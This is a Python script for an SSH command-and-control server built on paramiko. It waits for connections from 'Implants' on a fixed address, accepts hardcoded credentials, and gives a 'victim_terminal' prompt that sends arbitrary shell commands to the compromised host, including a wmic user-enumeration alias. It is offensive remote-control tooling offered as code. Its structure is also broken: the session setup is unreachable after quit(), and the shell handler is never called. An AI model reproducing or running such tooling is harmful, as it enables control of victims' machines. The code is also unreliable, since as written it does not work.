import paramiko
import os
import socket


 #this object def a session or connection 
class Sshserver(paramiko.ServerInterface):

    def check_channel_request(self, kind, chanid):
        if kind == 'session': 
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    #authentication for session
    def check_auth_password(self, username, password):
        if (username == 'admin123') and (password == 'pass123'):
            return paramiko.AUTH_SUCCESSFUL 
        return paramiko.AUTH_FAILED




def main():
    server = '192.168.56.1'
    port = 3535
    CWD = os.getcwd()
    #THIS RSA TO BE GENERATED
    HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'id_rsa'))
    #the id_rsa key should be generated in the same dir as the server or the CWD.
     
    #The code below is to manage socket traffic to the server
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen()
        print("Listening for Connections from Implants....")
        client, addr = sock.accept()
    except KeyboardInterrupt:
        quit()

        SSH_Session = paramiko.Transport(client)
        SSH_Session.add_server_key(HOSTKEY)
        server = Sshserver()
        SSH_Session.start_server(server=server)
        chan = SSH_Session.accept()
        if chan is None:
            print("Channel Error.!!")
            quit()
            #print(chan) #for debugging the chan output
        chk_in_msg = chan.recv(1024).decode()
        print(f'{chk_in_msg}')
        chan.send(' ')
        #this part will handle the communication between the client and server once the handshake is complete..
        #it also handles the commands entered by the user through the termnal/commandline
    def shell_handler():
        #this try statement handles the commands entered by the user....
        try:
            while True:
                cmd = ('victim_terminal#>')
                cmdd = input(cmd + '')
                if cmdd ==  'get_users':
                    cmdd = ('wmic useraccount list brief')
                    chan.send(cmdd)
                    ret_value = chan.recv(8192)
                    print(ret_value.decode())
                if cmdd == '':
                    shell_handler()
        #this else statement is for handling if nothing was entered or something other than the usual commands were entered
                else:
                    try:
                        chan.send(cmdd)
                        ret_value = chan.recv(8192)
                        print(ret_value.decode())
                    except SystemError:
                        pass
        except Exception as e:
            print(str(e))
            pass
        except KeyboardInterrupt:
            quit()

if __name__  == "__main__":
    main()